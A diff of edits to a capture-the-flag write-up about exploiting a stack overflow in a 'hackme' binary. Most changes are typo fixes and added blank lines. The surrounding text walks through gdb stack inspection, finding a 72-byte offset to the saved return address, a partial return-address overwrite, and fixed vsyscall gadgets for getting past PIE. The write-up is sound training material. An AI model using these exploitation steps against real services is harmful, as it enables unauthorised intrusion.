@@ -15,6 +15,7 @@ Connect to school.fluxfingers.net:1514
 
 
 This challenge provided us with the executable and the source code. Let's analyze the binary and see what we find out:
+    
     $ file hackme
     hackme: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=f46fbf9b159f6a1a31893faf7f771ca186a2ce8d, not stripped
     $ checksec.sh --file hackme
@@ -150,7 +151,8 @@ conn.send(payload)
 print conn.recv(4000)
 {% endhighlight %}
 
-To understand how many characters we have to push before the saved RIP, we're gonna need gdb. We will usi it to connect to the service just after we send the payload to analyze the stack just before the check_password_correct() function returns:
+To understand how many characters we have to push before the saved RIP, we're gonna need gdb. We will use it to connect to the service just after we send the payload to analyze the stack just before the check_password_correct() function returns:
+
     $ ps -a | grep exe
     8214 pts/1    00:00:00 exe
     $ sudo gdb attach 8214
@@ -178,6 +180,7 @@ To understand how many characters we have to push before the saved RIP, we're go
     0x7ffd46f25148: 0x00007f98631f8469  0x00007ffd46f272b6
 
 The first thing we notice here is that we overwrote the return address from check_password_correct with 0x6161617461616173, that is the hex for 'aaataaas'. Using cyclic_find we can easily understand how many characters we have to write before our forged RIP:
+
     >>> from pwn import *
     >>> unhex('6161617461616173')
     'aaataaas'
@@ -185,7 +188,7 @@ The first thing we notice here is that we overwrote the return address from chec
     72
 
 So, we have to write 72 characters before the RIP.
-We can also notice another thing, that is that at 0x7ffd46f25118 we have the return address from the require_auth() function, but that we overwrote the last 2 bytes of this address. We can easily verify this:
+We can also notice another thing: 0x7ffd46f25118 is very similar to the return address from the require_auth() function, but with the last 2 bytes being overwritten. We can easily verify this:
 
     gdb-peda$ disas handle_request
     Dump of assembler code for function handle_request:
@@ -205,7 +208,7 @@ Good! We're almost there! On the stack we have 0x00007f98631f6177, and we want t
 
 # Looking for something useful
 
-We know that PIE is enabled, so addresses are changing everytime, but after all we don't need that much: a pop-ret or a ret ret are enough. After a few hours of digging, I found something that could easily bring us to get that damn flag. Running a couple of time the executable and mapping memory sections, I found that the vsyscall memory area had its address fixed
+We know that PIE is enabled, so addresses are changing everytime, but after all we don't need that much: pop-ret ret-ret are enough. After a few hours of digging, I found something that could easily bring us to get that damn flag. Running a couple of time the executable and mapping memory sections, I found that the vsyscall memory area had its address fixed
 
     gdb-peda$ info proc mappings
     process 8329
